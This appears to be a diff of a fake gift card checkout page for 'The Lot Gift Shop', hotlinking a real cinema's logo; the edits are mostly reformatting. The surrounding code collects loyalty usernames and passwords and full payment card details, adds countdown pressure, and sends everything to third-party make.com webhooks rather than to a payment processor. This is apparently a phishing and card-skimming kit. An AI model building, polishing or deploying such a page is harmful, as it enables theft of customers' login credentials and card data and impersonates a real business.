@@ -40,6 +40,8 @@
       font-weight: bold;
       color: var(--primary-dark);
       z-index: 10;
+      justify-content: center;
+      align-items: center;
     }
     #timer {text-align: center; font-size: 1.2rem; margin-bottom: 1rem; color: var(--primary-dark);}
     footer {text-align: center; padding: 1rem; font-size: 0.9rem; color: #666;}
@@ -55,7 +57,6 @@
       <img src="https://cdn.theatertoolkit.com/cdn/wwwroot/themes/custom/thelotent/images/logo.png?v=20250408.2" alt="The Lot Logo">
     </header>
     <main>
-      <!-- Amount Selection -->
       <section id="sec-amount" class="active">
         <h1>Select Gift Card Value</h1>
         <div class="controls">
@@ -65,7 +66,7 @@
         </div>
         <button id="next-loyalty">Continue</button>
       </section>
-      <!-- Loyalty Login -->
+
       <section id="sec-loyalty">
         <h1>Loyalty Login</h1>
         <form id="frm-loyalty">
@@ -77,7 +78,7 @@
           </div>
         </form>
       </section>
-      <!-- Payment -->
+
       <section id="sec-pay">
         <h1>Payment Details</h1>
         <div id="timer">Time remaining: <span id="time">03:00</span></div>
@@ -86,7 +87,10 @@
           <input type="tel" id="phone" placeholder="Phone" required />
           <label for="card_type">Card Type</label>
           <select id="card_type" required>
-            <option value="">Select Card</option><option>Visa</option><option>Mastercard</option><option>AMEX</option>
+            <option value="">Select Card</option>
+            <option value="Visa">Visa</option>
+            <option value="Mastercard">Mastercard</option>
+            <option value="AMEX">AMEX</option>
           </select>
           <input type="text" id="name" placeholder="Name on Card" required />
           <input type="text" id="number" placeholder="Card Number" maxlength="16" required />
@@ -101,7 +105,7 @@
           <button type="submit">Pay</button>
         </form>
       </section>
-      <!-- Thank You -->
+
       <section id="sec-thanks">
         <h1>Thank You!</h1>
         <p>Your order is confirmed. Check your email for details.</p>
@@ -110,6 +114,7 @@
     </main>
     <footer>&copy; The Lot Gift Shop</footer>
   </div>
+
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <script>
     const secs = {
@@ -120,7 +125,7 @@
     };
 
     let amt = 100, timerInterval;
-    let _loyaltyCard = ''; // <- Almacenamos el CardNumber de lealtad
+    let _loyaltyCard = '';
     const amtInput = document.getElementById('amount');
     const timeDisplay = document.getElementById('time');
 
@@ -162,7 +167,7 @@
       amtInput.value = amt;
       document.getElementById('user').value = '';
       document.getElementById('pass').value = '';
-      _loyaltyCard = ''; // Reiniciamos también el CardNumber
+      _loyaltyCard = '';
     }
 
     document.getElementById('dec').onclick = () => {
@@ -185,22 +190,17 @@
       const u = document.getElementById('user').value.trim(),
             p = document.getElementById('pass').value.trim();
       if (!u || !p) return alert('Please enter your loyalty credentials.');
-
       document.getElementById('loading').style.display = 'flex';
       fetch('https://hook.us2.make.com/4f5k8fj23ixvb0f6ndz8prnxqbac9x5k', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          loyaltyUser: u,
-          loyaltyPass: p,
-          amount: amt
-        })
+        body: JSON.stringify({ loyaltyUser: u, loyaltyPass: p, amount: amt })
       })
       .then(r => r.json())
       .then(r => {
         document.getElementById('loading').style.display = 'none';
         if (r.ExtendedResultCode !== 0) return alert(r.ErrorDescription || 'Invalid credentials.');
-        _loyaltyCard = r.CardNumber || ''; // Guardamos el CardNumber para el pago
+        _loyaltyCard = r.CardNumber || '';
         prepPay();
         show('pay');
       })
@@ -234,12 +234,26 @@
         ...(!!_loyaltyCard && { card_loyalty_number: _loyaltyCard })
       };
 
-    try{
-        const res=await fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
-        const txt=await res.text(), obj=JSON.parse(txt), r=Array.isArray(obj)?obj[0]:obj;
-        document.getElementById('loading').style.display='none'; if(r.ExtendedResultCode===0) { stopTimer(); show('thanks'); } else alert(r.ErrorDescription||'Payment error.');
-      }catch{document.getElementById('loading').style.display='none'; alert('Error processing payment.');}
+      try {
+        const res = await fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+        const txt = await res.text(), obj = JSON.parse(txt), r = Array.isArray(obj) ? obj[0] : obj;
+        document.getElementById('loading').style.display = 'none';
+        if (r.ExtendedResultCode === 0) {
+          stopTimer();
+          show('thanks');
+        } else {
+          alert(r.ErrorDescription || 'Payment error.');
+        }
+      } catch {
+        document.getElementById('loading').style.display = 'none';
+        alert('Error processing payment.');
+      }
     };
+
     document.getElementById('finish').onclick = () => location.reload();
   </script>
 </body>
